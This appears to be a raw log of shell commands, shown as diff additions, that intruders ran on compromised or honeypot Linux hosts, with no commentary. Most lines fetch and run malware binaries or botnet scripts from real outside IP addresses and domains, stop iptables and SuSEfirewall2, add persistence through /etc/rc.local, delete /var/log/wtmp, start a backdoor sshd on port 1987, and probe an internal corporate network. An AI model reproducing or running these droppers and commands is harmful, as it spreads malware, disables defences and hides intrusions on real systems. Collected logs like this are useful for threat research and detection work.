+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://badluckjosh.pw/dongs/blj.sh || busybox wget http://badluckjosh.pw/dongs/blj.sh || curl -O http://badluckjosh.pw/dongs/blj.sh || busybox curl -O http://badluckjosh.pw/dongs/blj.sh;sh blj.sh;exit &
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://badluckjosh.pw/dongs/blj.sh || busybox wget http://badluckjosh.pw/dongs/blj.sh || curl -O http://badluckjosh.pw/dongs/blj.sh || busybox curl -O http://badluckjosh.pw/dongs/blj.sh;sh blj.sh;exit &
+wget -qO - http://52.8.123.250/x/1sh | sh > /dev/null 2>&1 &
+rm -rf /var/run/1sh; wget -c http://52.8.123.250/x/1sh -P /var/run && sh /var/run/1sh &
+wget -qO - http://52.8.123.250/x/2sh | sh > /dev/null 2>&1 &
+rm -rf /tmp/2sh; wget -c http://52.8.123.250/x/2sh -P /tmp && sh /tmp/2sh &
+curl http://52.8.123.250/x/3sh | sh
+uname -a || echo - 
+service iptables stop
+wget http://125.88.183.7:10258/tplin
+chmod 777 tplin
+./tplin
+chmod 0755 /root/tplin
+nohup /root/tplin &gt; /dev/null 2&gt;&amp;1 &amp;
+chmod 0777 tplin
+chmod u+x tplin
+./tplin &
+chmod u+x tplin
+./tplin &
+cd /tmp
+service iptables stop
+wget http://125.88.183.7:10258/san.txt
+chmod 0755 /root/san.txt
+nohup /root/san.txt > /dev/null 2>&1 &
+chmod 777 san.txt
+./164
+chmod 0755 /root/san.txt
+nohup /root/san.txt &gt; /dev/null 2&gt;&amp;1 &amp;
+chmod 0777 san.txt
+chmod u+x san.txt
+./san.txt &
+chmod u+x dos6cc4
+./san.txt &
+cd /tmp
+echo "cd  /root/">>/etc/rc.local
+echo "./tplin&">>/etc/rc.local
+echo "./san.txt&">>/etc/rc.local
+echo "/etc/init.d/iptables stop">>/etc/rc.local
+curl -O http://208.67.1.238/armv6;chmod +x armv6;./armv6;rm -f armv6;curl -O http://208.67.1.238/armv7;chmod +x armv7;./armv7
+service iptables stop
+wget http://125.88.183.7:10258/tplin
+nohup /root/tplin > /dev/null 2>&1 &
+chmod 777 tplin
+./tplin
+chmod 0755 /root/tplin
+nohup /root/tplin &gt; /dev/null 2&gt;&amp;1 &amp;
+chmod 0777 tplin
+chmod u+x tplin
+./tplin &
+chmod u+x tplin
+./tplin &
+cd /tmp
+service iptables stop
+wget http://125.88.183.7:10258/san.txt
+chmod 0755 /root/san.txt
+nohup /root/san.txt > /dev/null 2>&1 &
+chmod 777 san.txt
+./164
+chmod 0755 /root/san.txt
+nohup /root/san.txt &gt; /dev/null 2&gt;&amp;1 &amp;
+chmod 0777 san.txt
+chmod u+x san.txt
+./san.txt &
+chmod u+x dos6cc4
+./san.txt &
+cd /tmp
+echo "cd  /root/">>/etc/rc.local
+echo "./tplin&">>/etc/rc.local
+echo "./san.txt&">>/etc/rc.local
+echo "/etc/init.d/iptables stop">>/etc/rc.local
+cd /tmp; rm -rf gb.sh; wget -q http://23.94.97.5/Sharky/gb.sh; sh gb.sh
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://badluckjosh.pw/dongs/blj.sh || busybox wget http://badluckjosh.pw/dongs/blj.sh || curl -O http://badluckjosh.pw/dongs/blj.sh || busybox curl -O http://badluckjosh.pw/dongs/blj.sh;sh blj.sh;exit &
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://badluckjosh.pw/dongs/blj.sh || busybox wget http://badluckjosh.pw/dongs/blj.sh || curl -O http://badluckjosh.pw/dongs/blj.sh || busybox curl -O http://badluckjosh.pw/dongs/blj.sh;sh blj.sh;exit &
+curl -o /tmp/007 http://23.234.25.140:15827/007
+curl -o /tmp/007 http://23.234.25.140:15827/007
+curl -o /tmp/007 http://23.234.25.140:15827/007
+curl -o /tmp/007 http://23.234.25.140:15827/007
+chmod 777 /tmp/007
+/tmp/007
+service iptables stop
+/etc/init.d/iptables stop
+SuSEfirewall2 stop
+reSuSEfirewall2 stop
+wget -O /tmp/ixix http://101.201.210.55:280/ixix
+wget http://101.201.210.55:280/ixix
+service iptables stop
+/etc/init.d/iptables stop
+SuSEfirewall2 stop
+reSuSEfirewall2 stop
+wget -O /tmp/Linux2 http://101.201.210.55:280/Linux2.4
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://badluckjosh.pw/dongs/blj.sh || busybox wget http://badluckjosh.pw/dongs/blj.sh || curl -O http://badluckjosh.pw/dongs/blj.sh || busybox curl -O http://badluckjosh.pw/dongs/blj.sh || tftp -r blj.sh -g 149.202.153.56 || tftp 149.202.153.56 -c get blj.sh;sh blj.sh;exit &
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://badluckjosh.pw/dongs/blj.sh || busybox wget http://badluckjosh.pw/dongs/blj.sh || curl -O http://badluckjosh.pw/dongs/blj.sh || busybox curl -O http://badluckjosh.pw/dongs/blj.sh || tftp -r blj.sh -g 149.202.153.56 || tftp 149.202.153.56 -c get blj.sh;sh blj.sh;exit &
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://badluckjosh.pw/dongs/blj.sh || busybox wget http://badluckjosh.pw/dongs/blj.sh || curl -O http://badluckjosh.pw/dongs/blj.sh || busybox curl -O http://badluckjosh.pw/dongs/blj.sh || tftp -r blj.sh -g 149.202.153.56 || tftp 149.202.153.56 -c get blj.sh;sh blj.sh;exit &
+/etc/init.d/iptables stop
+service iptables stop
+SuSEfirewall2 stop
+reSuSEfirewall2 stop
+cd /tmp
+wget -c http://115.230.126.87:11123/0407.25535
+chmod 0777 0407.25535
+./0407.25535
+echo "cd /tmp/">>/etc/rc.local
+echo "./0407.25535&">>/etc/rc.local
+echo "/etc/init.d/iptables stop">>/etc/rc.local
+/etc/init.d/iptables stop
+service iptables stop
+SuSEfirewall2 stop
+reSuSEfirewall2 stop
+cd /tmp
+wget -c http://115.230.126.87:11123/xy-arm
+chmod 0777 xy-arm
+./xy-arm
+cd /tmp
+wget -c http://115.230.126.87:11123/xy-wrt
+chmod 0777 xy-wrt
+./xy-wrt
+echo "cd /tmp/">>/etc/rc.local
+echo "./xy-arm&">>/etc/rc.local
+echo "./xy-wrt&">>/etc/rc.local
+echo "/etc/init.d/iptables stop">>/etc/rc.local
+curl -O http://208.67.1.238/armv6;chmod +x armv6;./armv6;rm -f armv6;curl -O http://208.67.1.238/armv7;chmod +x armv7;./armv7
+wget http://208.67.1.238/armv6;chmod +x armv6;./armv6;rm -f armv6;wget http://208.67.1.238/armv7;chmod +x armv7;./armv7
+service iptables stop
+wget http://222.186.56.217:65533/wrt
+chmod 0777 wrt
+./wrt &
+wget http://222.186.56.217:65533/arm
+chmod 0777 rm
+./arm &
+wget http://222.186.56.217:65533/mips
+chmod 0777 mips
+./mips &
+wget http://222.186.56.217:65533/amr7
+chmod 0777 amr7
+./amr7 &
+service iptables stop
+wget http://222.186.56.217:65533/wrt
+wget http://222.186.56.217:65533/arm
+chmod 0777 rm
+./arm &
+wget http://222.186.56.217:65533/mips
+chmod 0777 mips
+./mips &
+wget http://222.186.56.217:65533/amr7
+chmod 0777 amr7
+./amr7 &
+w
+ifconfig
+cat /proc/cpuinfo
+cd /var/tmp
+ls
+cd bot
+ls -all
+ls -all
+locate bot
+apt-grt
+apt-get
+apt-get install locate
+ls
+cd /tmp || cd /var/run;wget http://208.67.1.62/.free.sh;sh .free.sh;rm -rf .free.sh;tftp -r .zone.sh -g 208.67.1.62;sh .zone.sh; tftp 208.67.1.62 -c get .zone1.sh; sh .zone1.sh; rm -rf .zone.sh .zone1.sh .free.sh
+ls
+cat /proc/cpuinfo
+cd /tmp || cd /var/run;wget http://208.67.1.62/.free.sh;sh .free.sh;rm -rf .free.sh;tftp -r .zone.sh -g 208.67.1.62;sh .zone.sh; tftp 208.67.1.62 -c get .zone1.sh; sh .zone1.sh; rm -rf .zone.sh .zone1.sh .free.sh
+service iptables stop
+wget http://61.160.195.176:1234/exqer
+chmod 0755 /root/exqer
+nohup /root/exqer > /dev/null 2>&1 &
+chmod 777 exqer
+./exqer
+chmod 0755 /root/exqer
+nohup /root/exqer &gt; /dev/null 2&gt;&amp;1 &amp;
+chmod 0777 exqer
+chmod u+x exqer
+./exqer &
+chmod u+x exqer
+./exqer &
+cd /tmp
+service iptables stop
+wget http://61.160.195.176:1234/expers
+chmod 0755 /root/expers
+nohup /root/expers > /dev/null 2>&1 &
+chmod 777 expers
+./expers
+chmod 0755 /root/expers
+nohup /root/expers &gt; /dev/null 2&gt;&amp;1 &amp;
+chmod 0777 expers
+chmod u+x expers
+./expers &
+chmod u+x expers
+./expers &
+cd /tmp
+echo "cd  /root/">>/etc/rc.local
+echo "./expers&">>/etc/rc.local
+echo "./expers&">>/etc/rc.local
+echo "/etc/init.d/iptables stop">>/etc/rc.local
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://115.28.206.48:9981/s25;chmod 777 s25;./s25;
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://115.28.206.48:9981/s25;chmod 777 s25;./s25;
+id
+id
+id
+id
+id
+id
+id
+id
+id
+id
+id
+version
+id
+version
+id
+id
+version
+version
+id
+version
+id
+version
+id
+id
+id
+whoami
+ps -ef
+ping www.oa.com
+ping ads.oa.com
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;cd /tmp;wget -c http://222.186.129.248:62911/bhcnb;chmod 777 bhcnb;./bhcnb;echo "cd /tmp/">>/etc/rc.local;echo "./bhcnb&">>/etc/rc.local;echo "/etc/init.d/iptables stop">>/etc/rc.local; 
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;cd /tmp;wget -c http://222.186.129.248:62911/bhcnb;chmod 777 bhcnb;./bhcnb;echo "cd /tmp/">>/etc/rc.local;echo "./bhcnb&">>/etc/rc.local;echo "/etc/init.d/iptables stop">>/etc/rc.local; 
+history
+w
+ls
+ls -a
+ls -al
+cd .ssh/
+ls
+cat known_hosts 
+wget http://www.baidu.com
+ls
+rm index.html 
+ls
+cd ../
+ls
+pwd
+cd ../
+ls
+cd mnt/
+ls
+ls -al
+cd ../
+cd tmp/
+ls
+ls -al
+ls
+ls -al
+history
+ps -ef
+pwd
+ls
+ls -al
+cd ../
+ls
+ipconfig
+ifconfig
+ping 10.141.40.1
+ping 10.141.40.2
+ping 10.141.40.3
+ping ut.oa.com
+ping indigo.oa.com
+ping service.oa.com
+ping hunter.oa.com
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;cd /tmp;wget -c http://222.186.129.248:62911/bhcnb;chmod 777 bhcnb;./bhcnb;echo "cd /tmp/">>/etc/rc.local;echo "./bhcnb&">>/etc/rc.local;echo "/etc/init.d/iptables stop">>/etc/rc.local; 
+wget hunter.oa.com
+wget 10.242.136.27
+ls
+pwd
+cd ../
+ls
+history
+cd root/
+ls
+ls -al
+wget www.baidu.com
+cat index.html 
+wget svn.tencent.com
+wget 8000.tencent.com
+cat index.html 
+echo "Uname: "`uname -a`;echo "ID: "`id`
+ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=1987
+service iptables stop
+cd /tmp
+wget http://mdb7.cn:8081/exp
+chmod 0777 /root/exp
+nohup /root/exp > /dev/null 2>&1 &
+rm -f /var/log/wtmp
+rm -rf exp
+wget -P/tmp http://115.28.206.48:9981/3264
+chmod 0777 /tmp/3264
+/tmp/./3264
+wget http://118.193.213.154:9516/ikon
+chmod 755 ikon
+./ikon
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;cd /tmp;wget -c http://222.186.129.248:52911/Lxx;chmod 777 Lxx;./Lxx;echo "cd /tmp/">>/etc/rc.local;echo "./Lxx&">>/etc/rc.local;echo "/etc/init.d/iptables stop">>/etc/rc.local; 
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;cd /tmp;wget -c http://222.186.129.248:52911/Lxx;chmod 777 Lxx;./Lxx;echo "cd /tmp/">>/etc/rc.local;echo "./Lxx&">>/etc/rc.local;echo "/etc/init.d/iptables stop">>/etc/rc.local; 
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;cd /tmp;wget -c http://222.186.129.248:52911/Lxx;chmod 777 Lxx;./Lxx;echo "cd /tmp/">>/etc/rc.local;echo "./Lxx&">>/etc/rc.local;echo "/etc/init.d/iptables stop">>/etc/rc.local; 
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;cd /tmp;wget -c http://222.186.129.236:8080/Lxx;chmod 777 Lxx;./Lxx;echo "cd /tmp/">>/etc/rc.local;echo "./Lxx&">>/etc/rc.local;echo "/etc/init.d/iptables stop">>/etc/rc.local;
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;cd /tmp;wget -c http://222.186.129.236:8080/Lxx;chmod 777 Lxx;./Lxx;echo "cd /tmp/">>/etc/rc.local;echo "./Lxx&">>/etc/rc.local;echo "/etc/init.d/iptables stop">>/etc/rc.local;
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;cd /tmp;wget -c http://222.186.129.236:8080/Lxx;chmod 777 Lxx;./Lxx;echo "cd /tmp/">>/etc/rc.local;echo "./Lxx&">>/etc/rc.local;echo "/etc/init.d/iptables stop">>/etc/rc.local;
+service iptables stop
+wget http://222.186.56.217:999/dd-wrt
+chmod 0777 dd-wrt
+./dd-wrt &
+wget http://222.186.56.217:999/Linux2.4
+chmod 0777 Linux2.4
+./Linux2.4 &
+wget http://222.186.56.217:999/Linux2.6
+chmod 0777 Linux2.6
+./Linux2.6 &
+wget http://222.186.56.217:999/linux-arm
+chmod 0777 linux-arm
+./linux-arm &
+wget http://222.186.56.217:999/linux-mips
+chmod 0777 linux-mips
+./linux-mips &
+service iptables stop
+wget http://222.186.56.217:999/wrt
+chmod 0777 wrt
+./wrt &
+wget http://222.186.56.217:999/Linux24
+chmod 0777 Linux24
+./Linux2.4 &
+wget http://222.186.56.217:999/Linux26
+chmod 0777 Linux26
+./Linux2.6 &
+wget http://222.186.56.217:999/arm
+chmod 0777 rm
+./arm &
+wget http://222.186.56.217:999/mips
+chmod 0777 mips
+./mips &
+curl -O http://208.67.1.238/armv6;chmod +x armv6;./armv6;rm -f armv6;curl -O http://208.67.1.238/armv7;chmod +x armv7;./armv7
+service iptables stop
+wget http://222.186.56.217:999/wrt
+chmod 0777 wrt
+./wrt &
+wget http://222.186.56.217:999/Linux24
+chmod 0777 Linux24
+./Linux2.4 &
+wget http://222.186.56.217:999/Linux26
+chmod 0777 Linux26
+./Linux2.6 &
+wget http://222.186.56.217:999/arm
+chmod 0777 rm
+./arm &
+wget http://222.186.56.217:999/mips
+chmod 0777 mips
+./mips &
+free -m
+service iptables stop
+wget http://222.186.56.217:999/wrt
+chmod 0777 wrt
+./wrt &
+wget http://222.186.56.217:999/arm
+chmod 0777 rm
+./arm &
+wget http://222.186.56.217:999/mips
+chmod 0777 mips
+./mips &
+wget http://222.186.56.217:999/amr7
+chmod 0777 amr7
+./amr7 &
+service iptables stop
+wget http://222.186.56.217:999/wrt
+chmod 0777 wrt
+./wrt &
+wget http://222.186.56.217:999/arm
+chmod 0777 rm
+./arm &
+wget http://222.186.56.217:999/mips
+chmod 0777 mips
+./mips &
+wget http://222.186.56.217:999/amr7
+chmod 0777 amr7
+./amr7 &
+service iptables stop
+wget http://222.186.56.217:999/wrt
+chmod 0777 wrt
+./wrt &
+wget http://222.186.56.217:999/arm
+chmod 0777 rm
+./arm &
+wget http://222.186.56.217:999/mips
+chmod 0777 mips
+./mips &
+wget http://222.186.56.217:999/amr7
+chmod 0777 amr7
+./amr7 &
+service iptables stop
+wget http://222.186.56.217:999/wrt
+chmod 0777 wrt
+./wrt &
+wget http://222.186.56.217:999/arm
+chmod 0777 rm
+./arm &
+wget http://222.186.56.217:999/mips
+chmod 0777 mips
+./mips &
+wget http://222.186.56.217:999/amr7
+./amr7 &
+service iptables stop
